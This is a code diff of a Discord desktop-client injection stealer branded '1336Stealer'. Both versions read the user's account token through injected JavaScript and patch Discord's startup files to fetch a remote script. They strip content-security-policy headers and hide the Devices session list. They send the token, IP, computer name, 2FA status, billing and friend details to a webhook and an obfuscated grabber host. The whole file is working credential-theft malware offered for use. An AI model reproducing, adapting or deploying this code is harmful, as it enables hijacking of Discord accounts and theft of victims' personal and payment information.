@@ -1,1313 +1,755 @@
-const fs = require('fs');
-const path = require('path');
-const {
-    BrowserWindow,
-    session
-} = require('electron')
-const args = process.argv;
-const querystring = require('querystring');
-const os = require('os')
+process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0
+
+const fs = require("fs")
+const electron = require("electron")
 const https = require("https");
-const computerName = os.hostname();
+const queryString = require("querystring")
 
-
-const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
-
-String.prototype.insert = function(index, string) {
-    if (index > 0) {
-        return this.substring(0, index) + string + this.substr(index);
-    }
-
-    return string + this;
-};
-
-const config = {
+var computerName = process.env.COMPUTERNAME
+var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
+var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();`
+var doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? true : false
+var config = {
     "logout": "true",
     "logout-notify": "true",
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://github.com/Nowze/1336Archive/blob/main/injection-1336.js",
+    injection_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/injection-1336.js",
     webhook: "%WEBHOOK%",
-    apiurl: "http://reidoscoins.top",
-    filter2: {
-        urls: [
-      "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
-      "https://*.discord.com/api/v*/applications/detectable",
-      "https://discord.com/api/v*/applications/detectable",
-      "https://*.discord.com/api/v*/users/@me/library",
-      "https://discord.com/api/v*/users/@me/library",
-      "wss://remote-auth-gateway.discord.gg/*",
-    ],
+    uwu: "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x6f\x67\x69\x6e\x2e\x62\x6c\x61\x63\x6b\x63\x61\x70\x2d\x67\x72\x61\x62\x62\x65\x72\x2e\x63\x6f\x6d\x3a\x33\x30\x30\x30\x2f\x70\x72\x65\x6d\x69\x75\x6d\x2f",
+    Filter: {
+        "urls": [
+            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
+            "https://*.discord.com/api/v*/applications/detectable",
+            "https://discord.com/api/v*/applications/detectable",
+            "https://*.discord.com/api/v*/users/@me/library",
+            "https://discord.com/api/v*/users/@me/library",
+            "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
+            "https://discord.com/api/v*/users/@me/billing/subscriptions",
+            "wss://remote-auth-gateway.discord.gg/*"
+        ]
     },
+    onCompleted: {
+        urls: [
+            "https://discord.com/api/v*/users/@me",
+            "https://discordapp.com/api/v*/users/@me",
+            "https://*.discord.com/api/v*/users/@me",
+            "https://discordapp.com/api/v*/auth/login",
+            'https://discord.com/api/v*/auth/login',
+            'https://*.discord.com/api/v*/auth/login',
+            "https://api.stripe.com/v*/tokens"
+        ]
+    }
 };
 
+async function execScript(str) {
+    var window = electron.BrowserWindow.getAllWindows()[0]
+    var script = await window.webContents.executeJavaScript(str, true)
+    return script || null
 
+}
 
-let bannerurl = ""
-let usericonurl = ""
+const makeEmbed = async ({
+    title,
+    fields,
+    image,
+    thumbnail,
+    description
+}) => {
+    var params = {
+        username: "1336St34ler | https://t.me/St34ler",
+        avatar_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png",
+        content: "",
+        embeds: [{
+            title: title,
+            color: config["embed-color"],
+            fields: fields,
+            description: description ?? "",
+            author: {
+                name: "1336St34ler | https://t.me/St34ler"
+            },
+            footer: {
+                text: "@1336St34ler > Bby | https://t.me/St34ler"
+            },
 
-const discordPath = (function() {
-    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
-    let resourcePath;
-    if (process.platform === "win32") {
-        resourcePath = path.join(app, "resources");
-    } else if (process.platform === "darwin") {
-        resourcePath = path.join(app, "Contents", "Resources");
-    }
-    if (fs.existsSync(resourcePath)) return {
-        resourcePath,
-        app
+        }]
     };
-    return "", "";
-})();
 
-function updateCheck() {
-    const {
-        resourcePath,
-        app
-    } = discordPath;
-    if (resourcePath === undefined || app === undefined) return;
-    const appPath = path.join(resourcePath, "app");
-    const packageJson = path.join(appPath, "package.json");
-    const resourceIndex = path.join(appPath, "index.js");
-    //const indexJs = '%num_core_discord%'
-    const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
-    const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
-    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
-    if(app === 'Lightcord')return;
-    if(app === 'DiscordCanary')return;
-    if(app === 'DiscordPTB')return;
-    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
-    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
-
-    if (process.platform === "win32" || process.platform === "darwin") {
-        fs.writeFileSync(
-            packageJson,
-            JSON.stringify({
-                    name: "discord",
-                    main: "index.js",
-                },
-                null,
-                4,
-            ),
-        );
-
-
-
-        setTimeout(() => {
-            
-        const startUpScript = `const fs = require('fs'), https = require('https');
-const indexJS = '${indexJs}';
-const bdPath = '${bdPath}';
-
-
-
-const fileSize = fs.statSync(indexJS).size
-fs.readFileSync(indexJS, 'utf8', (err, data) => {
-    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
-        init();
-})
-async function init() {
-    https.get('${config.injection_url}', (res) => {
-        const file = fs.createWriteStream(indexJS);
-        res.replace('%num_core_discord%', indexJS).replace('%WEBHOOK%', '${config.webhook}')
-        res.pipe(file);
-        file.on('finish', () => {
-            file.close();
-        });
-    
-    }).on("error", (err) => {
-        setTimeout(init(), 10000);
-    });
-}
-require('${path.join(resourcePath, "app.asar")}')
-if (fs.existsSync(bdPath)) require(bdPath);`;
-
-        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
-    }, 5000);
+    if (image) params.embeds[0].image = {
+        url: image
     }
-    if (!fs.existsSync(path.join(__dirname, "1336"))) return !0;
-    execScript(
-        `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
-    );
-    return !1;
-}
-
-const execScript = (script) => {
-    const window = BrowserWindow.getAllWindows()[0];
-    return window.webContents.executeJavaScript(script, !0);
-};
-
-function sleep(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-};
-
-async function noSessionPlease() {
-    await sleep(1000)
-    execScript(`
-function userclick() {
-    waitForElm(".children-1xdcWE").then((elm)=>elm[2].remove())
-    waitForElm(".sectionTitle-3j2YI1").then((elm)=>elm[2].remove())
-}
-
-function IsSession(item) {
-    return item?.innerText?.includes("Devices")
-}
-
-function handler(e) {
-    e = e || window.event;
-    var target = e.target || e.srcElement,
-    text = target.textContent || target.innerText;   
-    if (IsSession(target)) userclick()
-}
-function waitForElm(selector) {
-    return new Promise(resolve => {
-        const observer = new MutationObserver(mutations => {
-            if (document.querySelectorAll(selector).length>2) {
-                resolve(document.querySelectorAll(selector))
-            observer.disconnect();
-            }
-        });
-        observer.observe(document.body, {
-            childList: true,
-            subtree: true
-        });
-    });
-}
-document.addEventListener('click',handler,false);
-`)
-};
-
-
-noSessionPlease()
-
-const hooker = async (content) => {
-    const data = JSON.stringify(content);
-    const url = new URL(config.webhook);
-    const options = {
-        protocol: url.protocol,
-        hostname: url.host,
-        path: url.pathname,
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-            "Access-Control-Allow-Origin": "*",
-        },
-    };
-    const req = https.request(options);
-
-    req.on("error", (err) => {
-        console.log(err);
-    });
-    req.write(data);
-    req.end();
-};
-
-
-async function post(url, embed){
-    const window = BrowserWindow.getAllWindows()[0];
-    console.log(url + embed)
-    var b = await window.webContents.executeJavaScript(` 
-    fetch("${url}", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(${embed})
-    })`, !0)
-    return b
-}
-
-session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-    if (details.url.startsWith(config.apiurl)) {
-        if (details.url.includes("discord.com")) {
-            callback({
-                responseHeaders: Object.assign({
-                    'Access-Control-Allow-Headers': "*"
-                }, details.responseHeaders)
-            });
-        } else {
-            callback({
-                responseHeaders: Object.assign({
-                    "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
-                    'Access-Control-Allow-Headers': "*",
-                    "Access-Control-Allow-Origin": "*"
-                }, details.responseHeaders)
-            });
-        }
-
-
-    } else {
-        delete details.responseHeaders['content-security-policy'];
-        delete details.responseHeaders['content-security-policy-report-only'];
-
-        callback({
-            responseHeaders: {
-                ...details.responseHeaders,
-                'Access-Control-Allow-Headers': "*"
-            }
-        })
+    if (thumbnail) params.embeds[0].thumbnail = {
+        url: thumbnail
     }
-
-})
-
-
-
-
-
-
-async function FirstTime() {
-    const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.executeJavaScript(`${EvalToken}`, !0).then((async token => {
-
-        if (config['init-notify'] == "true") {
-            if (fs.existsSync(path.join(__dirname, "1336"))) {
-                fs.rmdirSync(path.join(__dirname, "1336"));
-                if (token == null || token == undefined || token == "") {
-                    var {
-                        ip
-                    } = await getFromURL("https://www.myexternalip.com/json", null)
-                    const c = {
-                        username: "1336Stealer | t.me/St34ler",
-                        avatar_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png",
-                        content: "",
-                        embeds: [{
-                            title: "1336Stealer Initalized",
-                            color: config["embed-color"],
-                            fields: [{
-                                name: "Injection Info",
-                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
-                                inline: !1
-							}],
-                            author: {
-                                name: "1336Stealer"
-                            },
-						}]
-                    };
-                    let data = JSON.stringify(c);
-                    let UwU = JSON.stringify({ data: data, token: token })
-                    post(config.apiurl, UwU);
-                    hooker(c)
-
-                } else {
-                    var b = await getFromURL("https://discord.com/api/v8/users/@me", token)
-                    var {
-                        ip
-                    } = await getFromURL("https://www.myexternalip.com/json", null)
-                    
-                    if(b.avatar === null){
-                        usericonurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
-                    }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
-                    if(b.banner === null){
-                        bannerurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
-                    }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
-                    const c = {
-                        username: "1336Stealer | t.me/St34ler",
-                        avatar_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png",
-                        content: "",
-                        embeds: [{
-                            title: "1336Stealer Initalized",
-                            description: `${b.username}'s account`,
-                            color: config["embed-color"],
-                            fields: [{
-                                name: "Injection Info",
-                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
-                                inline: !1
-								}, {
-                                name: ":mag_right: User ID",
-                                value: `\`${b.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
-                                inline: !0
-                                }, {
-                                name: ":bust_in_silhouette: Username ",
-                                value: `\`${b.username}#${b.discriminator}\``,
-                                inline: !0
-								}, {
-                                name: "<:badge:1067551347332878487> Badges",
-                                value: `${GetBadges(b.flags)}`,
-                                inline: !0
-								}, {
-                                name: ":a2f: A2F",
-                                value: `${GetA2F(b.mfa_enabled)}`,
-                                inline: !0
-								}, {
-                                name: "<:token:1067551382103658597> Token",
-                                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
-                                inline: !1
-								}],
-                            image: {
-                                url: bannerurl,
-                            },
-                            thumbnail: {
-                                url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
-                            }
-							}]
-                    };
-
-                    let data = JSON.stringify(c);
-                    let UwU = JSON.stringify({ data: data, token: token })
-                    post(config.apiurl, UwU);
-                    hooker(c)
-                };
-
-
-
-
-                if (!fs.existsSync(path.join(__dirname, "1336"))) {
-                    return !0
-                }
-
-                fs.rmdirSync(path.join(__dirname, "1336"));
-                if (config.logout != "false" || config.logout !== "%LOGOUT%") {
-                    if (config['logout-notify'] == "true") {
-                        if (token == null || token == undefined || token == "") {
-                            var {
-                                ip
-                            } = await getFromURL("https://www.myexternalip.com/json", null)
-                            const c = {
-                                username: "1336Stealer | t.me/St34ler",
-                                avatar_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png",
-                                content: "",
-                                embeds: [{
-                                    title: "1336Stealer User log out (User not Logged in before)",
-                                    color: config["embed-color"],
-                                    fields: [{
-                                        name: "Injection Info",
-                                        value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
-                                        inline: !1
-							}],
-                                    author: {
-                                        name: "1336Stealer"
-                                    },
-						}]
-                            };
-                            
-                            let data = JSON.stringify(c);
-                            let UwU = JSON.stringify({ data: data, token: token })
-                            post(config.apiurl, UwU);
-                            hooker(c)
-
-                        } else {
-                            var b = await getFromURL("https://discord.com/api/v8/users/@me", token)
-                            var {
-                                ip
-                            } = await getFromURL("https://www.myexternalip.com/json", null)
-                            if(b.avatar === null){
-                                usericonurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
-                            }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
-                            if(b.banner === null){
-                                bannerurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
-                            }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
-                            const c = {
-                                username: "1336Stealer | t.me/St34ler",
-                                avatar_url: "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png",
-                                content: "",
-                                embeds: [{
-                                    title: "1336Stealer Victim got logged out",
-                                    description: `${info.username}'s account`,
-                                    color: config["embed-color"],
-                                    fields: [{
-                                        name: "Injection Info",
-                                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
-                                        inline: !1
-								}, {
-                                    name: ":mag_right: User ID",
-                                    value: `\`${b.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
-                                    inline: !0
-								}, {
-                                        name: ":bust_in_silhouette: Username",
-                                        value: `\`${b.username}#${b.discriminator}\``,
-                                        inline: !0
-								}, {
-                                        name: "<:badge:1067551347332878487> Badges",
-                                        value: `${GetBadges(b.flags)}`,
-                                        inline: !0
-								}, {
-                                        name: "<a:a2f:1040272766982692885> A2F",
-                                        value: `${GetA2F(b.mfa_enabled)}`,
-                                        inline: !0
-								}, {
-                                        name: "<:token:1067551382103658597> Token",
-                                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
-                                        inline: !1
-								}],
-
-
-                                    image: {
-                                        url: bannerurl,
-                                    },
-                                    thumbnail: {
-                                        url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
-                                    }
-							}]
-                            };
-                            let data = JSON.stringify(c);
-                            let UwU = JSON.stringify({ data: data, token: token })
-                            post(config.apiurl, UwU);
-                            hooker(c)
-                            
-                        }
-                    }
-
-
-                    const window = BrowserWindow.getAllWindows()[0];
-                    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
-                }
-                return !1
-            }
-        }
-    }))
+    return params
+}
+const getIP = async () => {
+    var json = await execScript(`var xmlHttp = new XMLHttpRequest();\nxmlHttp.open( "GET", "https://www.myexternalip.com/json", false );\nxmlHttp.send( null );\nJSON.parse(xmlHttp.responseText);`)
+    return json.ip
 }
 
-
-const Filter = {
-    "urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
-}
-
-
-
-
-
-async function getFromURL(url, token) {
-    const window = BrowserWindow.getAllWindows()[0];
-    var b = await window.webContents.executeJavaScript(`
+const getURL = async (url, token) => {
+    var c = await execScript(`
     var xmlHttp = new XMLHttpRequest();
     xmlHttp.open( "GET", "${url}", false );
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
-    JSON.parse(xmlHttp.responseText);`, !0)
-    return b
+    JSON.parse(xmlHttp.responseText);`)
+    return c
+}
+
+const getGifOrPNG = async (url) => {
+    var tt = [".gif?size=512", ".png?size=512"]
+
+    var headers = await new Promise(resolve => {
+        https.get(url, res => resolve(res.headers))
+    })
+    var type = headers["content-type"]
+    if (type == "image/gif") return url + tt[0]
+    else return url + tt[1]
+}
+
+const GetBadges = (e) => {
+    var n = "";
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:918207395279273985> "), 4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
+}
+const GetRBadges = (e) => {
+    var n = "";
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:918207395279273985> "), 4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
+}
+
+const GetNSFW = (bouki) => {
+    switch (bouki) {
+        case true:
+            return ":underage: `NSFW Allowed`"
+        case false:
+            return ":underage: `NSFW Not Allowed`"
+        default:
+            return "Can't see"
+    }
+}
+const GetA2F = (bouki) => {
+    switch (bouki) {
+        case true:
+            return ":lock: `A2F Enabled`"
+        case false:
+            return ":unlock: `A2F Not Enabled`"
+        default:
+            return "Can't see"
+    }
 }
 
 
-
-
-function GetNSFW(reader) {
-    if (reader == true) {
-        return ":underage: `NSFW Allowed`"
+const parseFriends = friends => {
+    var real = friends.filter(x => x.type == 1)
+    var rareFriends = ""
+    for (var friend of real) {
+        var badges = GetRBadges(friend.user.public_flags)
+        if (badges !== ":x:") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`
     }
-    if (reader == false) {
-        return ":underage: `NSFW Not Allowed`"
-    } else {
-        return "Can't see"
-    }
-}
-
-function GetA2F(reader) {
-    if (reader == true) {
-        return ":lock: `A2F Enabled`"
-    }
-    if (reader == false) {
-        return ":unlock: `A2F Not Enabled`"
-    } else {
-        return "Can't see"
+    if (!rareFriends) rareFriends = "No Rare Friends"
+    return {
+        len: real.length,
+        badges: rareFriends
     }
 }
 
-
-
-function GetNitro(flags) {
-    if (flags == 0) {
-        return "No Nitro"
-    }
-    if (flags == 1) {
-        return "<:classic:896119171019067423> \`Nitro Classic\`"
-    }
-    if (flags == 2) {
-        return "<a:boost:824036778570416129> \`Nitro Boost\`"
-    } else {
-        return "No Nitro"
-    }
+const parseBilling = billings => {
+    var Billings = ""
+    billings.forEach(res => {
+        if (res.invalid) return
+        switch (res.type) {
+            case 1:
+                Billings += ":heavy_check_mark: :credit_card:"
+                break
+            case 2:
+                Billings += ":heavy_check_mark: <:paypal:896441236062347374>"
+        }
+    })
+    if (!Billings) Billings = ":x:"
+    return Billings
 }
 
+const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b))
 
-function GetRBadges(flags) {
-    const Discord_Employee = 1;
-    const Partnered_Server_Owner = 2;
-    const HypeSquad_Events = 4;
-    const Bug_Hunter_Level_1 = 8;
-    const Early_Supporter = 512;
-    const Bug_Hunter_Level_2 = 16384;
-    const Early_Verified_Bot_Developer = 131072;
-    var badges = "";
-    if ((flags & Discord_Employee) == Discord_Employee) {
-        badges += "<:staff:874750808728666152> "
+const GetNitro = r => {
+    switch (r.premium_type) {
+        default:
+            return ":x:"
+        case 1:
+            return "<:946246402105819216:962747802797113365>"
+        case 2:
+            if (!r.premium_guild_since) return "<:946246402105819216:962747802797113365>"
+            var now = new Date(Date.now())
+            var arr = ["<:Booster1Month:1051453771147911208>", "<:Booster2Month:1051453772360077374>", "<:Booster6Month:1051453773463162890>", "<:Booster9Month:1051453774620803122>", "<:boost12month:1068308256088400004>", "<:Booster15Month:1051453775832961034>", "<:BoosterLevel8:1051453778127237180>", "<:Booster24Month:1051453776889917530>"]
+            var a = [new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since)]
+            var b = [2, 3, 6, 9, 12, 15, 18, 24]
+            var r = []
+            for (var p in a) r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000))
+            var i = 0
+            for (var p of r) p > 0 ? "" : i++
+            return "<:946246402105819216:962747802797113365> " + arr[i]
     }
-    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
-        badges += "<:partner:874750808678354964> "
-    }
-    if ((flags & HypeSquad_Events) == HypeSquad_Events) {
-        badges += "<:hypesquad_events:874750808594477056> "
-    }
-    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
-        badges += "<:bughunter_1:874750808426692658> "
-    }
-    if ((flags & Early_Supporter) == Early_Supporter) {
-        badges += "<:early_supporter:874750808414113823> "
-    }
-    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
-        badges += "<:bughunter_2:874750808430874664> "
-    }
-    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
-        badges += "<:developer:874750808472825986> "
-    }
-    if (badges == "") {
-        badges = ""
-    }
-    return badges
 }
 
 function GetLangue(read) {
-    const France = 'fr';
-    const Dansk = 'da';
-    const Deutsch = 'de';
-    const englishUK = 'en-GB';
-    const englishUS = 'en-US';
-    const espagnol = 'es-ES';
-    const hrvatski = 'hr';
-    const italianio = 'it';
-    const lietuviskai = 'lt';
-    const magyar = 'hu';
-    const neerland = 'nl';
-    const Norsk = 'no';
-    const polski = 'pl';
-    const portugues = 'pr-BR';
-    const Romana = 'ro';
-    const finlandais = 'fi';
-    const svenska = 'sv-SE';
-    const tiengviet = 'vi';
-    const turk = 'tr';
-    const cestina = 'cs';
-    const grecque = 'el';
-    const bulgar = 'bg';
-    const russe = 'ru';
-    const ukrainier = 'uk';
-    const inde = 'hi';
-    const thai = 'th';
-    const chineschina = 'zh-CN';
-    const japonais = 'ja';
-    const chinestaiwan = 'zh-TW';
-    const korea = 'ko';
-    var langue = "";
-    if (read == France) {
-        langue += ":flag_fr: French"
+    var languages = {
+        "fr": ":flag_fr: French",
+        "da": ":flag_dk: Dansk",
+        "de": ":flag_de: Deutsch",
+        "en-GB": ":england: English (UK)",
+        "en-US": ":flag_us: USA",
+        "en-ES": ":flag_es: Espagnol",
+        "hr": ":flag_hr: Croatian",
+        "it": ":flag_it: Italianio",
+        "lt": ":flag_lt: Lithuanian",
+        "hu": ":flag_no::flag_hu: Hungarian",
+        "no": ":flag_no: Norwegian",
+        "pl": ":flag_pl: Polish",
+        'pr-BR': ":flag_pt: Portuguese",
+        "ro": ":flag_ro: Romanian",
+        "fi": ":flag_fi: Finnish",
+        "sv-SE": ":flag_se: Swedish",
+        "vi": ":flag_vn: Vietnamese",
+        "tr": ":flag_tr: Turkish",
+        "cs": ":flag_cz: Czech",
+        "el": ":flag_gr: Greek",
+        "bg": ":flag_bg: Bulgarian",
+        "ru": ":flag_ru: Russian",
+        "uk": ":flag_ua: Ukrainian",
+        "hi": ":flag_in: Indian",
+        "th": ":flag_tw: Taiwanese",
+        "zh-CN": ":flag_cn: Chinese-China",
+        "ja": ":flag_jp: Japanese",
+        "zh-TW": ":flag_cn: Chinese-Taiwanese",
+        "ko": ":flag_kr: Korean"
     }
-    if (read == Dansk) {
-        langue += ":flag_dk: Dansk"
-    }
-    if (read == Deutsch) {
-        langue += ":flag_de: Deutsch"
-    }
-    if (read == englishUK) {
-        langue += ":england: English"
-    }
-    if (read == englishUS) {
-        langue += ":flag_us: USA"
-    }
-    if (read == espagnol) {
-        langue += ":flag_es: Espagnol"
-    }
-    if (read == hrvatski) {
-        langue += ":flag_hr: Croatian"
-    }
-    if (read == italianio) {
-        langue += ":flag_it: Italianio"
-    }
-    if (read == lietuviskai) {
-        langue += ":flag_lt: Lithuanian"
-    }
-    if (read == magyar) {
-        langue += ":flag_hu: Hungarian"
-    }
-    if (read == neerland) {
-        langue += ":flag_nl: Dutch"
-    }
-    if (read == Norsk) {
-        langue += ":flag_no: Norwegian"
-    }
-    if (read == polski) {
-        langue += ":flag_pl: Polish"
-    }
-    if (read == portugues) {
-        langue += ":flag_pt: Portuguese"
-    }
-    if (read == Romana) {
-        langue += ":flag_ro: Romanian"
-    }
-    if (read == finlandais) {
-        langue += ":flag_fi: Finnish"
-    }
-    if (read == svenska) {
-        langue += ":flag_se: Swedish"
-    }
-    if (read == turk) {
-        langue += ":flag_tr: Turkish"
-    }
-    if (read == tiengviet) {
-        langue += ":flag_vn: Vietnamese"
-    }
-    if (read == cestina) {
-        langue += ":flag_cz: Czech"
-    }
-    if (read == grecque) {
-        langue += ":flag_gr: Greek"
-    }
-    if (read == bulgar) {
-        langue += ":flag_bg: Bulgarian"
-    }
-    if (read == russe) {
-        langue += ":flag_ru: Russian"
-    }
-    if (read == ukrainier) {
-        langue += ":flag_ua: Ukrainian"
-    }
-    if (read == inde) {
-        langue += ":flag_in: Indian"
-    }
-    if (read == thai) {
-        langue += ":flag_tw: Taiwanese"
-    }
-    if (read == chineschina) {
-        langue += ":flag_cn: Chinese-China"
-    }
-    if (read == japonais) {
-        langue += ":flag_jp: Japanese"
-    }
-    if (read == chinestaiwan) {
-        langue += ":flag_cn: Chinese-Taiwanese"
-    }
-    if (read == korea) {
-        langue += ":flag_kr: Korean"
-    }
-    if (langue == "") {
-        langue = ":x: None"
-    }
+
+    var langue = languages[read] || "No Languages Detected ????";
     return langue
 }
-
-function GetBadges(flags) {
-    const Discord_Employee = 1;
-    const Partnered_Server_Owner = 2;
-    const HypeSquad_Events = 4;
-    const Bug_Hunter_Level_1 = 8;
-    const House_Bravery = 64;
-    const House_Brilliance = 128;
-    const House_Balance = 256;
-    const Early_Supporter = 512;
-    const Bug_Hunter_Level_2 = 16384;
-    const Early_Verified_Bot_Developer = 131072;
-    const Discord_Active_Developer = 4194304;
-    var badges = "";
-    if ((flags & Discord_Employee) == Discord_Employee) {
-        badges += "<:staff:874750808728666152> "
-    }
-    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
-        badges += "<:partner:874750808678354964> "
-    }
-    if ((flags & HypeSquad_Events) == HypeSquad_Events) {
-        badges += "<:hypesquad_events:874750808594477056> "
-    }
-    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
-        badges += "<:bughunter_1:874750808426692658> "
-    }
-    if ((flags & House_Bravery) == House_Bravery) {
-        badges += "<:bravery:874750808388952075> "
-    }
